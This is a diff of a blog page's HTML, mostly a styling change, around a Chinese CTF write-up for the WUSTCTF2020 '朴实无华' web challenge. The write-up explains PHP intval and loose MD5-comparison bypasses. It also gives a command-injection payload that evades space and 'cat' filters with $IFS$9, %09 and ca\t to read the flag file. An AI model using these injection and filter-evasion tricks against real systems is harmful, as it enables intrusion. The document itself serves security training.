@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,10 +255,10 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[WUSTCTF2020]朴实无华<br><img src="https://ftp.bmp.ovh/imgs/2021/03/273a5c946a150017.png" srcset="/img/loading.gif">      </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>没啥东西，看看<code>robots.txt</code>         </p>
-<div class="hljs"><pre><code>User-agent: *
-Disallow: /fAke_f1agggg.php     </code></pre></div>
+<pre><code>User-agent: *
+Disallow: /fAke_f1agggg.php     </code></pre>
 <p>访问<br><img src="https://ftp.bmp.ovh/imgs/2021/03/3f6fe65b4f82f8c7.png" srcset="/img/loading.gif"><br>访问后出现源码      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);
 error_reporting(<span class="hljs-number">0</span>);
 highlight_file(<span class="hljs-keyword">__file__</span>);
@@ -292,9 +300,9 @@ highlight_file(<span class="hljs-keyword">__file__</span>);
     <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;去非洲吧&quot;</span>);
 &#125;
 <span class="hljs-meta">?&gt;</span>
-去非洲吧</code></pre></div></code></pre>
+去非洲吧</code></pre></code></pre>
 <p>第一个：<br>intval函数——–&gt;获取变量的整数值      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-keyword">echo</span> intval(<span class="hljs-number">42</span>);                      <span class="hljs-comment">// 42</span>
 <span class="hljs-keyword">echo</span> intval(<span class="hljs-number">4.2</span>);                     <span class="hljs-comment">// 4</span>
 <span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>);                    <span class="hljs-comment">// 42</span>
@@ -312,7 +320,7 @@ highlight_file(<span class="hljs-keyword">__file__</span>);
 <span class="hljs-keyword">echo</span> intval(<span class="hljs-string">&#x27;42&#x27;</span>, <span class="hljs-number">8</span>);                 <span class="hljs-comment">// 34</span>
 <span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>());                 <span class="hljs-comment">// 0</span>
 <span class="hljs-keyword">echo</span> intval(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>));     <span class="hljs-comment">// 1</span>
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>字符串<code>&#39;1e11&#39;</code>—-1<br>数字<code>1e10</code>——&gt;1410065408<br>利用这个绕过<br><code>num=2019e11</code><br>第二个：<br>MD5：<code>$a==md5($a)</code>———&gt;<code>0e215962017</code><br>第三个：<br>命令执行<br>ls<br><code>404.html fAke_f1agggg.php fl4g.php fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag img.jpg index.php robots.txt </code><br>空格被过，用<code>$IFS$9</code>绕过,php环境下<code>%09</code>也可绕过空格<br>cat变成ca\t可绕过，也可直接tac        </p>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>payload：<code>?num=2019e11&amp;md5=0e215962017&amp;get_flag=ca\t%09fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>        </p>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><code>$IFS</code>也可以绕过空格，但是<code>ls$IFS/</code>能执行，而<code>tac$IFSflag</code>却不能执行成功，为什么呢？        </p>
@@ -463,6 +471,8 @@ highlight_file(<span class="hljs-keyword">__file__</span>);
 
 
 
+  
+    
   
 
 
